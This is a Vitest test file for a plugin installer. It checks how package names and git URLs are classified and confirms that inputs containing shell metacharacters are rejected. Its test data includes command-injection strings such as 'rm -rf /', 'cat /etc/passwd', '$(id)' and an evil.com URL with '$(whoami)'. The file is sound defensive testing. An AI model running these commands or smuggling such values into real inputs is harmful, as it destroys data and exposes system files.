/**
 * Plugin Installer Tests
 *
 * Tests for security validation of package names and git URLs
 */

import { describe, expect, it } from "vitest";
import { detectSourceType } from "../src/installer.js";

describe("Plugin Installer", () => {
  describe("detectSourceType", () => {
    it("detects npm packages", () => {
      expect(detectSourceType("lodash")).toBe("npm");
      expect(detectSourceType("@types/node")).toBe("npm");
      expect(detectSourceType("npm:express")).toBe("npm");
    });

    it("detects git URLs", () => {
      expect(detectSourceType("github:user/repo")).toBe("git");
      expect(detectSourceType("gitlab:user/repo")).toBe("git");
      expect(detectSourceType("https://github.com/user/repo")).toBe("git");
    });

    it("detects local paths", () => {
      expect(detectSourceType("./local-plugin")).toBe("local");
      expect(detectSourceType("../parent-plugin")).toBe("local");
      expect(detectSourceType("/absolute/path")).toBe("local");
      expect(detectSourceType("~/home-path")).toBe("local");
    });
  });

  describe("security validation", () => {
    // Test that malicious package names are rejected
    // These tests verify the validation happens without actually running npm install

    it("rejects package names with shell metacharacters", async () => {
      const { installFromNpm } = await import("../src/installer.js");

      // These should all fail validation
      const maliciousNames = [
        "package; rm -rf /",
        "package && echo pwned",
        "package | cat /etc/passwd",
        "package`whoami`",
        "$(malicious)",
        "package$(id)",
        "pkg > /tmp/evil",
        "pkg < /etc/passwd",
      ];

      for (const name of maliciousNames) {
        const result = await installFromNpm(name);
        expect(result.success).toBe(false);
        expect(result.error).toContain("Invalid package name");
      }
    });

    it("rejects git URLs with shell metacharacters", async () => {
      const { installFromGit } = await import("../src/installer.js");

      const maliciousUrls = [
        "https://github.com/user/repo; rm -rf /",
        "github:user/repo && echo pwned",
        "https://evil.com/$(whoami)/repo",
      ];

      for (const url of maliciousUrls) {
        const result = await installFromGit(url);
        expect(result.success).toBe(false);
        expect(result.error).toContain("Invalid git URL");
      }
    });

    it("accepts valid npm package names", async () => {
      const { installFromNpm } = await import("../src/installer.js");

      // These are valid patterns but will fail at npm install (which is fine)
      // The important thing is they pass validation
      const validNames = [
        "lodash",
        "@types/node",
        "my-package",
        "package123",
        "my_package",
        "@scope/package-name",
        "package@1.0.0",
        "package@^1.0.0",
      ];

      for (const name of validNames) {
        const result = await installFromNpm(name, { targetDir: "/tmp/test-plugins" });
        // Should NOT fail with "Invalid package name" error
        if (!result.success) {
          expect(result.error).not.toContain("Invalid package name");
        }
      }
    });
  });
});
